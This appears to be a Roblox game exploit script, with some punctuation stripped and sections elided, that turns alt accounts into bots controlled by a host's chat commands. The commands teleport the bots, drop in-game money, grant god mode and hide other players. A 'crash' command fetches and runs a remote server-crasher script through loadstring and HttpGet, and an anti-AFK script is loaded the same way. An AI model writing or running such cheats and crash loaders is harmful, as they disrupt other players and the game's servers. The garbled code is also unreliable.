...
local function saymsg(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequestFireServer(msg, 'All')
end
...
gameGetService(RunService).SteppedConnect(function()
	if Settings_['Dropping'] == true then
		game.ReplicatedStorage.MainEventFireServer(DropMoney,10000)
	end
	if Settings_['Blocking'] == true then
		game.ReplicatedStorage.MainEventFireServer(Block,true)
	end
...
local function cmds(msg,plr)
	if isaop == false or table.find(Settings['Host'],game.PlayersGetPlayerByUserId(plr).Name) then
		if msg == Settings['Prefix']..bring then
			if not isaop then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.PlayersGetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.X,game.PlayersGetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Y,game.PlayersGetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Z+5)
			end
		...
		elseif msg == Settings['Prefix']..drop then
			if not isaop then
				...
				game.Players.LocalPlayer.BackpackFindFirstChild(Wallet).Parent = game.Players.LocalPlayer.Character
		...
		elseif msg == Settings['Prefix']..stop then
			if not isaop then
				...
				game.Players.LocalPlayer.CharacterFindFirstChild(Wallet).Parent = game.Players.LocalPlayer.Backpack
				for i=1,10 do
					game.ReplicatedStorage.MainEventFireServer(Block,false)
					wait()
				end
			end
		...
		elseif msg == Settings['Prefix']..god then
			if not isaop then
				if game.Players.LocalPlayer.CharacterFindFirstChild(BodyEffects)FindFirstChild('Attacking') then
					game.Players.LocalPlayer.CharacterFindFirstChild(BodyEffects)FindFirstChild('Attacking')Destroy()
				end
			end
		elseif msg == Settings['Prefix']..crash then
			if not isaop then
				loadstring(gameHttpGet('httpsraw.githubusercontent.comlerkermerlua-projectsmasterSuperCustomServerCrasher'))()
			end
		...
		elseif msg == Settings['Prefix']..group then
			if not isaop then
				pcall(function()
					...
					for i,v in pairs(game.PlayersGetChildren()) do
						if v.Name ~= game.Players.LocalPlayer.Name then
							for i2,v2 in pairs(v.CharacterGetChildren()) do
								if v2IsA(MeshPart) or v2IsA(Accessory) or v.Name == Humanoid or v.Name == HumanoidRootPart then
									v2Destroy()
								end
							end
						end
				...
				local newPos = CFrame.new(game.PlayersGetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.X-5,game.PlayersGetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Y,game.PlayersGetPlayerByUserId(plr).Character.HumanoidRootPart.CFrame.Z+5)
		...
		elseif msg == Settings['Prefix']..float then
			if not isaop then
				...
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				setfpscap(Settings['FPS_CAP'])
				for i,v in pairs(game.Players.LocalPlayer.Character.HumanoidGetPlayingAnimationTracks()) do 
					if vIsA(AnimationTrack) and v.Name == FallAnim then
						vDestroy()
					end
				end
			end
		...
		elseif msg == Settings['Prefix']..vibe then
			if not isaop then 
				...
				Dance1ani.AnimationId = 'rbxassetid3189773368'
				local Dance1 = game.Players.LocalPlayer.Character.HumanoidLoadAnimation(Dance1ani)
				Dance1Play()
			end
		...
		elseif msg == Settings['Prefix']..reset then
			if not isaop then 
				for i,v in pairs(game.Players.LocalPlayer.CharacterGetChildren()) do
					if vIsA(MeshPart) or v.Name == HumanoidRootPart or v.Name == Humanoid then
						vDestroy()
					end
				end
			end
		elseif msg == Settings['Prefix']..mask then
			if not isaop then 
				...
				if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude = 50 then
					wait(.2)
					fireclickdetector(kFindFirstChild(ClickDetector), 4)
					toolf = game.Players.LocalPlayer.BackpackWaitForChild(Mask)
					toolf.Parent = game.Players.LocalPlayer.Character
					wait()
					game.Players.LocalPlayer.CharacterWaitForChild(Mask)
					gameGetService(VirtualUser)ClickButton1(Vector2.new())
					game.Players.LocalPlayer.CharacterWaitForChild(In-gameMask)
					game.Players.LocalPlayer.Character[In-gameMask].HandleDestroy()
...
game.Players.PlayerAddedConnect(function(plr)
	if table.find(Settings['Host'],plr.Name) then
		plr.ChattedConnect(function(msg)
			cmds(msg,plr.UserId)
		end)
	end
end)

for item,plr in pairs(game.PlayersGetChildren()) do
	if table.find(Settings['Host'],plr.Name) then
		plr.ChattedConnect(function(msg)
			cmds(msg,plr.UserId)
		end)
...
loadstring(gameHttpGet('httpsraw.githubusercontent.comgrandpascriptserror502mainAntiAfk.lua'))()
